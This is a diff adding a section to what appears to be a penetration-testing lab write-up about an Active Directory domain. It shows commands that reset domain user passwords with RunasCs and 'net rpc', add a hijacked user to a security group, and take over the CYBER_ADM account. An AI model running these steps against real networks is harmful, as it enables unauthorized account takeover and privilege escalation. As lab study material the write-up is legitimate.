@@ -211,3 +211,31 @@ On bloodhound we can see that pgibbons can control the user salvador
 
 <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
+{% code overflow="wrap" %}
+```
+.\RunasCs.exe pgibbons "I l0ve going Fishing!" "powershell.exe /c 'net user salvador hacker1 /domain'"
+```
+{% endcode %}
+
+```
+net rpc password "salvador" -U "corp.local"/"pgibbons" -S "172.16.1.5"
+```
+
+<figure><img src="../.gitbook/assets/immagine (43).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```
+net rpc group addmem "SECURITY ENGINEERS" "salvador" -U "corp.local"/"salvador"%"hacker1" -S "172.16.1.5"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (44).png" alt=""><figcaption></figcaption></figure>
+
+```
+net rpc password "CYBER_ADM" -U "corp.local"/"salvador" -S "172.16.1.5"
+```
+
+now login with remmina
+
+## DC01
+
